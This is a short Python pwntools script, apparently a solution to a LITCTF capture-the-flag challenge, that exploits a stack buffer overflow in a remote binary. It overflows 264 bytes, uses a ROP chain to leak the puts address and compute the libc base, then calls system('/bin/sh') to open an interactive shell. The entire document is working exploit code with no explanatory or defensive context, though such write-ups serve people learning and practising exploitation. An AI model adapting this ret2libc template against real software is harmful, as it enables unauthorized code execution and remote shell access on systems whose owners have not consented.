from pwn import *

context.binary = binary = './vuln'

elf = ELF(binary)
rop = ROP(elf)

libc = ELF('libc6_2.35-0ubuntu3.8_amd64.so')

#p = process()

p =remote('litctf.org',31774)
padding = b'A'*264

payload = padding
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0]) 
payload += p64(elf.got.puts)
payload += p64(elf.plt.puts)
payload += p64(elf.symbols.main)

p.sendline(payload)
p.sendline(b'1')
p.recvline()
p.recvline()
p.recvline()
p.recvline()
p.recvline()

leak = u64(p.recvline().strip().ljust(8,b'\0'))

log.info(f'Fputs leak => {hex(leak)}')


libc.address = leak - libc.symbols.puts

log.info(f'Libc base => {hex(libc.address)}')

payload = padding
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(next(libc.search(b'/bin/sh\x00')))
payload += p64(rop.find_gadget(['ret'])[0])
payload += p64(libc.symbols.system)
p.sendline(payload)
p.sendline(b'1')

p.interactive()

